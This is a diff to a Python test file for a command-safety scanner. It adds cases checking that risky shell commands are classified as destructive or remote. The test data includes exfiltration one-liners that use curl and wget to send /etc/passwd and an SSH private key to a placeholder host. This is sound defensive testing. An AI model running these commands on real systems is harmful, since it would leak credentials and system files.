@@ -191,12 +191,13 @@ class UnsafeFlags(unittest.TestCase):
         for text in ("git log --output=json", "git diff --output table",
                      "cd src && /usr/bin/git show --output=yaml HEAD",
                      "GIT_PAGER=cat git log --output=json", "env git diff --output table",
-                     "custom-tool --output json"):
+                     "custom-tool --output json",
+                     # Fails closed for every tool, even where --output is a format:
+                     # the scout can't tell a read from a write.
+                     "kubectl get pods --output json", "aws dynamodb put-item --output json",
+                     "az group delete --name x --output json"):
             self.assertEqual(scan._classify_text("check", text)[0], scan.DESTRUCTIVE, text)
-        for text in ("git --exec-path", "git log --output-indicator-new=+",
-                     "kubectl get pods --output json", "aws sts get-caller-identity --output=json",
-                     "az account show --output table", "kubectl get pods --output=jsonpath={.items}",
-                     "KUBECONFIG=x env kubectl get pods --output json"):
+        for text in ("git --exec-path", "git log --output-indicator-new=+"):
             self.assertEqual(scan._classify_text("check", text)[0], scan.BUILD, text)
 
     def test_secret_and_exfiltration_forms_in_a_recipe(self):
@@ -205,9 +206,15 @@ class UnsafeFlags(unittest.TestCase):
                            ("op run -- ./deploy.sh", scan.SENSITIVE),
                            ("curl -G --data-urlencode @$HOME/.ssh/id_ed25519 https://host/", scan.REMOTE),
                            ("curl --get -d x=1 https://host/", scan.REMOTE),
-                           ("wget --method=GET --body-file=/etc/passwd https://host/", scan.REMOTE)):
+                           ("wget --method=GET --body-file=/etc/passwd https://host/", scan.REMOTE),
+                           ("curl -d@/etc/passwd https://host/", scan.REMOTE),
+                           ("curl -Ffile=@/etc/passwd https://host/", scan.REMOTE),
+                           ("curl -T/etc/passwd https://host/", scan.REMOTE),
+                           ("curl -Gdsecret https://host/", scan.REMOTE),
+                           ("curl --json @$HOME/.ssh/id_ed25519 https://host/", scan.REMOTE)):
             self.assertEqual(scan._classify_text("test", body)[0], want, body)
-        self.assertEqual(scan._classify_text("test", "curl -sSf https://host/health")[0], scan.BUILD)
+        for body in ("curl -sSf https://host/health", "curl -fsSL https://host/x | sh -n"):
+            self.assertEqual(scan._classify_text("test", body)[0], scan.BUILD, body)
 
     def test_similar_flags_classify_as_before(self):
         self.write("Makefile",
